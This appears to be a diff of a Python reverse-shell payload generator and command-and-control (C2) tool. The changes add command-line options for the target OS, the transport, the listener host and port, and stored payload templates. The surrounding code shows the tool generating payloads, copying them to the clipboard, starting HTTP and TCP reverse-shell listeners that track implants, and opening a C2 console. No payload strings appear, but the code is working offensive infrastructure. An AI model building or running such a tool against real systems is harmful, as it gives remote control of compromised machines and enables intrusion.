@@ -18,6 +18,7 @@ import time
 from select import select
 import os
 import json
+import argparse
 
 # external deps
 from colorama import Fore, Style, init as colorama_init
@@ -157,6 +158,60 @@ def save_custom_payload(os_choice: str, name: str, template: str, transport: str
     data[name] = {"template": template, "transport": transport}
     with open(path, "w", encoding="utf-8") as f:
         json.dump(data, f, indent=2)
+
+
+def canonicalize_os(os_arg: str) -> str:
+    """Map CLI -os value to canonical 'Linux' or 'Windows'."""
+    if not os_arg:
+        raise ValueError("-os is required")
+    val = os_arg.strip().lower()
+    if val in ("l", "linux"):
+        return "Linux"
+    if val in ("w", "windows"):
+        return "Windows"
+    raise ValueError("-os must be 'l'/'linux' or 'w'/'windows'")
+
+
+def canonicalize_transport(con_arg: str) -> str:
+    """Map CLI -con to 'tcp' or 'http' (lowercase)."""
+    if not con_arg:
+        raise ValueError("-con is required")
+    val = con_arg.strip().lower()
+    if val in ("tcp", "http"):
+        return val
+    raise ValueError("-con must be 'tcp' or 'http'")
+
+
+def normalize_payload_placeholders(template: str, lhost: str, lport: int) -> str:
+    """Replace provided concrete LHOST/LPORT occurrences in template with {LHOST}/{LPORT}."""
+    if not isinstance(template, str):
+        return template
+    tmp = template.replace(lhost, "{LHOST}")
+    # Replace port tokens when they appear as standalone integer (not part of a larger number)
+    try:
+        port_pattern = re.compile(rf"(?<!\d){re.escape(str(lport))}(?!\d)")
+        tmp = port_pattern.sub("{LPORT}", tmp)
+    except Exception:
+        tmp = tmp.replace(str(lport), "{LPORT}")
+    return tmp
+
+
+def parse_cli_args():
+    parser = argparse.ArgumentParser(description="Payload generator and C2 listener")
+    parser.add_argument("-m", "--mode", choices=["b", "c"], required=True,
+                        help="b=build/use existing payloads; c=create/store a payload")
+    parser.add_argument("-os", "--os", dest="os", required=True,
+                        help="Target OS: l/linux or w/windows")
+    parser.add_argument("-con", "--connection", dest="connection", required=True,
+                        help="Connection type: tcp or http")
+    parser.add_argument("-lhost", dest="lhost", required=True, help="Listener host (IPv4)")
+    parser.add_argument("-lport", dest="lport", type=int, required=True, help="Listener port for selected connection type")
+    # Build mode optional direct payload selection
+    parser.add_argument("-p", "--payload", dest="payload_key", help="Payload key to use (skip interactive selection)")
+    # Create/store mode fields
+    parser.add_argument("-n", "--name", dest="name", help="Name for stored payload (mode c)")
+    parser.add_argument("-pay", "--payload-template", dest="payload_template", help="Payload template string to store (mode c)")
+    return parser.parse_args()
 
 
 # -----------------------
@@ -726,75 +781,73 @@ def main():
 
     print("=== Payload Generator + Listener ===\n")
 
-    # choose OS first
-    os_choice = ask_choice("Target OS (Linux/Windows): ", ["Linux", "Windows"])
+    # Parse CLI
+    try:
+        args = parse_cli_args()
+    except SystemExit:
+        return
 
-    # optionally allow user to add a custom payload first
-    add_custom = ask_choice("Add a custom payload before generating? (y/N): ", ["y", "n", "Y", "N"]).lower()
-    if add_custom == "y":
-        name = input("Enter a unique payload name: ").strip()
-        transport = ask_choice("Transport (TCP/HTTP): ", ["TCP", "HTTP"]).lower()
-        print("Paste the payload template below. Use {LHOST} and {LPORT} placeholders:")
-        template = input("> ")
-        # basic validation
-        if "{LHOST}" not in template or "{LPORT}" not in template:
-            print("[!] Template must include {LHOST} and {LPORT}. Skipping save.")
-        else:
-            save_custom_payload(os_choice, name, template, transport)
-            print(f"[+] Saved custom {os_choice} payload '{name}' ({transport}).")
+    try:
+        os_choice = canonicalize_os(args.os)
+        transport_choice = canonicalize_transport(args.connection)
+    except ValueError as e:
+        print(f"[!] {e}")
+        sys.exit(1)
 
-    # get LHOST
-    lhost = ask_ip("Enter LHOST (IPv4) to bind listeners and inject into payload: ")
+    # Validate LHOST and chosen LPORT; ensure bindable
+    lhost = args.lhost.strip()
+    if not is_valid_ipv4(lhost):
+        print("[!] Invalid -lhost IPv4 address")
+        sys.exit(1)
 
-    # ask transport independently of OS
-    transport_choice = ask_choice("Transport to use (TCP/HTTP): ", ["TCP", "HTTP"]).lower()
+    chosen_port = int(args.lport)
+    if not (1 <= chosen_port <= 65535):
+        print("[!] -lport must be 1-65535")
+        sys.exit(1)
+    if not can_bind(lhost, chosen_port):
+        print(f"[!] Cannot bind to {lhost}:{chosen_port}")
+        sys.exit(1)
 
-    # ports setup: always ask for chosen transport; set reasonable default for the other
-    http_port = None
-    tcp_port = None
+    # Determine listener ports for both transports
+    http_port = chosen_port if transport_choice == "http" else 2222
+    tcp_port = chosen_port if transport_choice == "tcp" else 4444
 
+    # Verify and auto-adjust secondary default port if needed
     if transport_choice == "http":
-        while True:
-            http_port = ask_port("Enter HTTP listener port (1-65535) [default TCP will be 4444]: ")
-            if not can_bind(lhost, http_port):
-                print(f"[!] Cannot bind to {lhost}:{http_port}. Try a different port or ensure the host interface exists.")
-                continue
-            break
-        # set default TCP
-        tcp_port = 4444
         if not can_bind(lhost, tcp_port):
-            print(f"[!] Default TCP 4444 unavailable on {lhost}.")
-            while True:
-                tcp_port = ask_port("Enter TCP (raw reverse shell) listener port (1-65535): ")
-                if not can_bind(lhost, tcp_port):
-                    print(f"[!] Cannot bind to {lhost}:{tcp_port}. Try a different port or ensure the host interface exists.")
-                    continue
-                break
-        else:
-            print(f"[*] Using default TCP port {tcp_port}.")
+            for alt in (4455, 5555, 7777, 9001):
+                if can_bind(lhost, alt):
+                    tcp_port = alt
+                    break
+            else:
+                print("[!] Could not find an available TCP port for the secondary listener.")
+                sys.exit(1)
     else:
-        while True:
-            tcp_port = ask_port("Enter TCP (raw reverse shell) listener port (1-65535) [default HTTP will be 2222]: ")
-            if not can_bind(lhost, tcp_port):
-                print(f"[!] Cannot bind to {lhost}:{tcp_port}. Try a different port or ensure the host interface exists.")
-                continue
-            break
-        # set default HTTP
-        http_port = 2222
         if not can_bind(lhost, http_port):
-            print(f"[!] Default HTTP 2222 unavailable on {lhost}.")
-            while True:
-                http_port = ask_port("Enter HTTP listener port (1-65535): ")
-                if not can_bind(lhost, http_port):
-                    print(f"[!] Cannot bind to {lhost}:{http_port}. Try a different port or ensure the host interface exists.")
-                    continue
-                break
-        else:
-            print(f"[*] Using default HTTP port {http_port}.")
+            for alt in (8080, 8000, 8888, 2223):
+                if can_bind(lhost, alt):
+                    http_port = alt
+                    break
+            else:
+                print("[!] Could not find an available HTTP port for the secondary listener.")
+                sys.exit(1)
 
-    # load builtin and custom payloads then filter by transport
+    if args.mode == "c":
+        # Create/store a payload
+        if not args.name or not args.payload_template:
+            print("[!] In create mode (-m=c) you must provide -n <name> and -pay <template>.")
+            sys.exit(1)
+        normalized = normalize_payload_placeholders(args.payload_template, lhost, chosen_port)
+        if "{LHOST}" not in normalized or "{LPORT}" not in normalized:
+            print("[!] Stored template must contain {LHOST} and {LPORT} placeholders after normalization.")
+            sys.exit(1)
+        save_custom_payload(os_choice, args.name.strip(), normalized, transport_choice)
+        print(f"[+] Stored payload '{args.name.strip()}' for {os_choice} ({transport_choice}).")
+        return
+
+    # Build/use mode (m=b)
     module = load_payload_module(os_choice)
-    builtin = module.payloads  # values are {template, transport}
+    builtin = module.payloads
     custom = load_custom_payloads(os_choice)
 
     combined = {}
@@ -805,24 +858,24 @@ def main():
         if isinstance(meta, dict) and meta.get("transport") in ("tcp", "http"):
             combined[name] = meta
 
-    wanted_transport = transport_choice
-    keys = [k for k, v in combined.items() if v.get("transport") == wanted_transport]
-
+    keys = [k for k, v in combined.items() if v.get("transport") == transport_choice]
     if not keys:
-        print(f"[!] No {wanted_transport.upper()} payloads available for {os_choice}.")
+        print(f"[!] No {transport_choice.upper()} payloads available for {os_choice}.")
         sys.exit(1)
 
-    print("\nAvailable payloads:")
+    print("Available payloads:")
     for k in keys:
         print(" -", k)
 
-    payload_key = ask_choice("Select payload (type exact key): ", keys)
+    payload_key = args.payload_key if args.payload_key else ask_choice("Select payload (type exact key): ", keys)
+    if payload_key not in keys:
+        print("[!] Invalid payload key.")
+        sys.exit(1)
 
     template = combined[payload_key]["template"]
-    selected_port = tcp_port if wanted_transport == "tcp" else http_port
+    selected_port = tcp_port if transport_choice == "tcp" else http_port
     payload_text = generate_payload_text(template, lhost, selected_port)
 
-    # display and copy
     print("\n[+] Generated payload (copied to clipboard):\n")
     print(Fore.RED + payload_text + Style.RESET_ALL)
     try:
@@ -835,18 +888,15 @@ def main():
     HOST = lhost
     HTTP_PORT = http_port
     RAW_TCP_PORT = tcp_port
-    # store OS choice globally for later logic
     global OS_CHOICE
     OS_CHOICE = os_choice
 
-    # start both listeners
     try:
         threading.Thread(target=run_http_server, daemon=True).start()
         threading.Thread(target=monitor_http_implants, daemon=True).start()
         threading.Thread(target=run_raw_tcp_server, daemon=True).start()
         time.sleep(0.5)
         print(f"\n[*] Listeners started on {HOST} (HTTP: {HTTP_PORT}, TCP: {RAW_TCP_PORT}).")
-        # Enter C2 console (blocking)
         c2_console()
     except Exception as e:
         print(f"[!] Failed to start listeners: {e}")
